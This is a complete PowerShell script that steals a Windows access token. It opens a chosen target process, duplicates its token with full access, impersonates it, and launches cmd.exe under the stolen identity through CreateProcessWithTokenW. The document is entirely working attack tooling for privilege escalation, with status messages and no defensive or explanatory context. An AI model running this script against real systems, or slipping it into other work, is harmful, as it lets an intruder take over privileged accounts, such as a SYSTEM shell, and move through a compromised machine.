param(
    [int]$TargetPID
)

Write-Host "`n[*] Target PID: $TargetPID" -ForegroundColor Cyan

Write-Host "[*] Loading WinAPI..." -ForegroundColor Yellow

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class TokenDebug
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr processHandle, UInt32 desiredAccess, out IntPtr tokenHandle);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(
        IntPtr existingToken,
        UInt32 desiredAccess,
        IntPtr tokenAttributes,
        int impersonationLevel,
        int tokenType,
        out IntPtr newToken
    );

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr token);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(
        IntPtr token,
        int logonFlags,
        string appName,
        string commandLine,
        int creationFlags,
        IntPtr environment,
        string currentDirectory,
        ref STARTUPINFO startupInfo,
        out PROCESS_INFORMATION processInformation
    );

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
}
"@
 
Write-Host "[+] WinAPI loaded`n" -ForegroundColor Green

function Show-LastError {
    $err = [TokenDebug]::GetLastError()
    Write-Host "[!] WinAPI Error: $err" -ForegroundColor Red
}

$PROCESS_QUERY_INFORMATION = 0x0400

Write-Host "[*] Opening process..." -ForegroundColor Yellow
$hProcess = [TokenDebug]::OpenProcess($PROCESS_QUERY_INFORMATION, $false, $TargetPID)

if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "[!] OpenProcess FAILED"
    Show-LastError
    exit
}

Write-Host "[+] Process handle: $hProcess"

$TOKEN_DUPLICATE = 0x0002
$TOKEN_QUERY = 0x0008
$TOKEN_ASSIGN_PRIMARY = 0x0001

$desiredAccess = $TOKEN_DUPLICATE -bor $TOKEN_QUERY -bor $TOKEN_ASSIGN_PRIMARY

Write-Host "[*] Opening process token..." -ForegroundColor Yellow

$hToken = [IntPtr]::Zero
$ok = [TokenDebug]::OpenProcessToken($hProcess, $desiredAccess, [ref]$hToken)

if (-not $ok) {
    Write-Host "[!] OpenProcessToken FAILED"
    Show-LastError
    exit
}

Write-Host "[+] Token handle: $hToken"

Write-Host "[*] Duplicating token..." -ForegroundColor Yellow

$SecurityImpersonation = 2
$TokenPrimary = 1
$TOKEN_ALL_ACCESS = 0xF01FF

$hDupToken = [IntPtr]::Zero

$ok = [TokenDebug]::DuplicateTokenEx(
    $hToken,
    $TOKEN_ALL_ACCESS,
    [IntPtr]::Zero,
    $SecurityImpersonation,
    $TokenPrimary,
    [ref]$hDupToken
)

if (-not $ok) {
    Write-Host "[!] DuplicateTokenEx FAILED"
    Show-LastError
    exit
}

Write-Host "[+] Duplicated token: $hDupToken"

Write-Host "`n[*] Impersonating..." -ForegroundColor Yellow

$ok = [TokenDebug]::ImpersonateLoggedOnUser($hDupToken)

if ($ok) {
    Write-Host "[+] Impersonation SUCCESS"

    Write-Host "[*] Identity:"
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

} else {
    Write-Host "[!] Impersonation FAILED"
    Show-LastError
}

[TokenDebug]::RevertToSelf() | Out-Null
Write-Host "[*] Reverted to self"

Write-Host "`n[*] Spawning new process..." -ForegroundColor Yellow

$LOGON_WITH_PROFILE   = 1
$CREATE_NEW_CONSOLE   = 0x00000010

$si = New-Object TokenDebug+STARTUPINFO
$pi = New-Object TokenDebug+PROCESS_INFORMATION
$si.cb = [Runtime.InteropServices.Marshal]::SizeOf($si)

$app = "C:\Windows\System32\cmd.exe"
$currentDir = "C:\Windows\System32"

Write-Host "[*] App: $app"
Write-Host "[*] Current dir: $currentDir"

$ok = [TokenDebug]::CreateProcessWithTokenW(
    $hDupToken,
    $LOGON_WITH_PROFILE,
    $app,
    $null,
    $CREATE_NEW_CONSOLE,
    [IntPtr]::Zero,
    $currentDir,
    [ref]$si,
    [ref]$pi
)

if ($ok) {
    Write-Host "[+] Process created! PID: $($pi.dwProcessId)" -ForegroundColor Green
} else {
    Write-Host "[!] CreateProcessWithTokenW FAILED"
    Show-LastError
}